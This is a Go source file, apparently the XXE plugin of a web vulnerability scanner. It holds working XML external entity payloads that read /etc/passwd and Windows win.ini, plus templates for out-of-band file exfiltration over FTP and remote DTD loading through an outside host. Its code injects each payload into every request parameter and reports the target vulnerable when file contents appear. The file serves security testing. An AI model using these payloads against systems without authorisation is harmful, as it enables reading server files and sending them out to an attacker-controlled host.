package xxe

import (
	"github.com/thoas/go-funk"
	"github.com/yhy0/Jie/pkg/input"
	"github.com/yhy0/Jie/pkg/output"
	"github.com/yhy0/Jie/pkg/protocols/httpx"
	"github.com/yhy0/logging"
	"time"
)

/**
  @author: yhy
  @since: 2023/1/5
  @desc: //TODO
**/

var ftp_template = `<!ENTITY % bbb SYSTEM "file:///tmp/"><!ENTITY % ccc "<!ENTITY &#37; ddd SYSTEM 'ftp://fakeuser:%bbb;@%HOSTNAME%:%FTP_PORT%/b'>">`
var ftp_client_file_template = `<!ENTITY % ccc "<!ENTITY &#37; ddd SYSTEM 'ftp://fakeuser:%bbb;@%HOSTNAME%:%FTP_PORT%/b'>">`

// bind-xxe
var reverse_template = []string{
	`<!DOCTYPE convert [<!ENTITY % remote SYSTEM "%s">%remote;]>`,
	`<!DOCTYPE uuu SYSTEM "%s">`,
}

var payloads = []string{
	`<?xml version="1.0"?><!DOCTYPE ANY [<!ENTITY content SYSTEM "file:///etc/passwd">]><a>&content;</a>`,
	`<?xml version="1.0" ?><root xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include href="file:///etc/passwd" parse="text"/></root>`,
	`<?xml version="1.0"?><!DOCTYPE ANY [<!ENTITY content SYSTEM "file:///c:/windows/win.ini">]>`,
	`<?xml version = "1.0"?><!DOCTYPE ANY [      <!ENTITY f SYSTEM "file:///C://Windows//win.ini">  ]><x>&f;</x>`,
}

func Scan(in *input.CrawlResult) {
	res, payload, isVul := startTesting(in)

	if isVul {
		output.OutChannel <- output.VulMessage{
			DataType: "web_vul",
			Plugin:   "XXE",
			VulnData: output.VulnData{
				CreateTime: time.Now().Format("2006-01-02 15:04:05"),
				Target:     in.Url,
				Method:     in.Method,
				Ip:         in.Ip,
				Param:      in.Kv,
				Request:    res.RequestDump,
				Response:   res.ResponseDump,
				Payload:    payload,
			},
			Level: output.Critical,
		}
	}

	logging.Logger.Debugf("cmd inject vulnerability not found")

}

func startTesting(in *input.CrawlResult) (*httpx.Response, string, bool) {

	variations, err := httpx.ParseUri(in.Url, []byte(in.RequestBody), in.Method, in.ContentType, in.Headers)
	if err != nil {
		logging.Logger.Errorln(err)
		return nil, "", false
	}

	if variations != nil {
		for _, p := range variations.Params {
			for _, payload := range payloads {
				in.Headers["encode"] = "encode"
				originpayload := variations.SetPayloadByIndex(p.Index, in.Url, payload, in.Method)

				var res *httpx.Response
				if in.Method == "GET" {
					res, err = httpx.Request(originpayload, in.Method, "", false, in.Headers)
				} else {
					res, err = httpx.Request(in.Url, in.Method, originpayload, false, in.Headers)
				}

				logging.Logger.Debugln("payload:", originpayload)
				if err != nil {
					continue
				}

				if funk.Contains(res.ResponseDump, "root:x:0:0:root:/root:") || funk.Contains(res.ResponseDump, "root:[x*]:0:0:") || funk.Contains(res.ResponseDump, "; for 16-bit app support") {
					return res, originpayload, true
				}
			}
		}
	}
	return nil, "", false
}
